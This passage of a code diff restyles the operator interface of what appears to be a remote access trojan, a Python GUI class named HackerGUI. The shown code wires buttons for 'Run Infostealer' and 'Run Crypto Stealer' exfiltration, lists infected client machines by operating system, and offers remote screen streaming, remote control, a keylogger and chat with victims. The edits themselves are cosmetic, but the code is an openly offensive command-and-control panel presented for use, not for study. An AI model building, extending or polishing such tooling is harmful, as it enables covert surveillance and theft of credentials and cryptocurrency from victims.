+        btn_frame.pack(fill="x", padx=12, pady=12)
         ctk.CTkButton(btn_frame, text="Run Infostealer",
                        command=lambda: self._request_exfil("infostealer"),
                        fg_color=THEME["accent"], hover_color=THEME["accent_hover"],
                        text_color=THEME["black"], height=32,
-                       font=("Segoe UI", 11, "bold")).pack(side="left", padx=(0, 4))
+                       font=("Segoe UI", 11, "bold"), corner_radius=6).pack(side="left", padx=(0, 8))
 
         self.stealer_text = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                             text_color=THEME["text"],
-                                            font=("Consolas", 10))
-        self.stealer_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))
+                                            font=("Consolas", 10),
+                                            border_width=1, border_color=THEME["border_gold"])
+        self.stealer_text.pack(fill="both", expand=True, padx=12, pady=(0, 12))
 
         self._stealer_frame = frame
 
     def _build_feature_crypto(self):
-        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])
+        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["bg"])
 
         btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
-        btn_frame.pack(fill="x", padx=8, pady=8)
+        btn_frame.pack(fill="x", padx=12, pady=12)
         ctk.CTkButton(btn_frame, text="Run Crypto Stealer",
                        command=lambda: self._request_exfil("crypto_stealer"),
                        fg_color=THEME["accent"], hover_color=THEME["accent_hover"],
                        text_color=THEME["black"], height=32,
-                       font=("Segoe UI", 11, "bold")).pack(side="left", padx=(0, 4))
+                       font=("Segoe UI", 11, "bold"), corner_radius=6).pack(side="left", padx=(0, 8))
 
         self.crypto_text = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                            text_color=THEME["text"],
-                                           font=("Consolas", 10))
-        self.crypto_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))
+                                           font=("Consolas", 10),
+                                           border_width=1, border_color=THEME["border_gold"])
+        self.crypto_text.pack(fill="both", expand=True, padx=12, pady=(0, 12))
 
         self._crypto_frame = frame
 
@@ -813,13 +837,14 @@ class HackerGUI:
 
     def _add_client_ui(self, client_id: str, info: dict):
         os_type = info.get("os", "?")
-        os_colors = {"Windows": THEME["green"], "Linux": THEME["cyan"], "Darwin": "#9b59b6"}
+        os_colors = {"Windows": THEME["accent"], "Linux": THEME["cyan"], "Darwin": "#9b59b6"}
         os_labels = {"Windows": "W", "Linux": "L", "Darwin": "M"}
         os_icon = os_labels.get(os_type, "?")
         icon_color = os_colors.get(os_type, THEME["text_dim"])
 
         card = ctk.CTkFrame(self.client_list, fg_color=THEME["card"],
-                             corner_radius=8, height=72, border_width=0)
+                             corner_radius=8, height=72, border_width=1,
+                             border_color=THEME["border_gold"])
         card.pack(fill="x", pady=2, padx=4)
         card.pack_propagate(False)
 
@@ -862,7 +887,7 @@ class HackerGUI:
                 if widget._client_id == self.current_client:
                     widget.configure(border_width=2, border_color=THEME["accent"])
                 else:
-                    widget.configure(border_width=0, border_color=THEME["card"])
+                    widget.configure(border_width=1, border_color=THEME["border_gold"])
 
     def _remove_client_ui(self, client_id: str):
         if client_id == self.current_client:
@@ -872,8 +897,8 @@ class HackerGUI:
             self.client_label.configure(text="No client selected")
             self.screen_canvas.delete("all")
             self.stream_btn.configure(text="  Start Stream  ",
-                                       fg_color="transparent", border_color=THEME["green"],
-                                       text_color=THEME["green"])
+                                       fg_color="transparent", border_color=THEME["accent"],
+                                       text_color=THEME["accent"])
             self.control_btn.configure(text="  Enable Control  ",
                                         fg_color="transparent", border_color=THEME["amber"],
                                         text_color=THEME["amber"])
@@ -940,8 +965,8 @@ class HackerGUI:
             self.server.stop_screen(self.current_client)
             self._stream_active = False
             self.stream_btn.configure(text="  Start Stream  ",
-                                       fg_color="transparent", border_color=THEME["green"],
-                                       text_color=THEME["green"])
+                                       fg_color="transparent", border_color=THEME["accent"],
+                                       text_color=THEME["accent"])
             self.status_label.configure(text="Stream stopped")
         else:
             self.server.start_screen(self.current_client)
@@ -1146,7 +1171,7 @@ class HackerGUI:
         if self._keylog_active:
             self.server.stop_keylog(self.current_client)
             self._keylog_active = False
-            self.keylog_btn.configure(text="Start Keylogger", fg_color=THEME["green"])
+            self.keylog_btn.configure(text="Start Keylogger", fg_color=THEME["accent_dim"])
             self.status_label.configure(text="Keylogger stopped")
         else:
             self.server.start_keylog(self.current_client)
@@ -1203,7 +1228,7 @@ class HackerGUI:
                       font=("Segoe UI", 11), text_color=THEME["text"]).pack(padx=16, pady=(16, 8), anchor="w")
         entry = ctk.CTkEntry(dialog, placeholder_text="Enter message...",
                               fg_color=THEME["card"], text_color=THEME["text"],
-                              border_color=THEME["border"],
+                              border_color=THEME["border_gold"],
                               font=("Segoe UI", 11), width=360, height=36)
         entry.pack(padx=16, pady=4)
         entry.focus()
@@ -1222,7 +1247,7 @@ class HackerGUI:
         ctk.CTkButton(dialog, text="Send", command=send,
                        fg_color=THEME["accent"], hover_color=THEME["accent_hover"],
                        text_color=THEME["black"], height=32,
-                       font=("Segoe UI", 10, "bold")).pack(pady=8)
+                       font=("Segoe UI", 10, "bold"), corner_radius=4).pack(pady=8)
 
     def _handle_chat_display(self, data: dict):
         msg = data.get("message", "")
